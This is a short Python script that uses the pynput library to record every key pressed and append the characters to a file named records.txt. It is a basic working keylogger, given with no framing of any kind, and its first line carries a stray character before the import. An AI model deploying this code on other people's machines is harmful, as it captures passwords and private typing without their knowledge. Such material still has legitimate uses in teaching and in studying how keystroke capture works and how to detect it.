jfrom pynput import keyboard

def KeyPressed(key):
    print(str(key))
    with open ("records.txt", "a") as logkey:
        try:
            char = key.char
            print(type(char))
            logkey.write(char)

        except : 
            if(str(key)=="Key.space"):
                logkey.write(" ") 

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=KeyPressed)
    listener.start()
    input()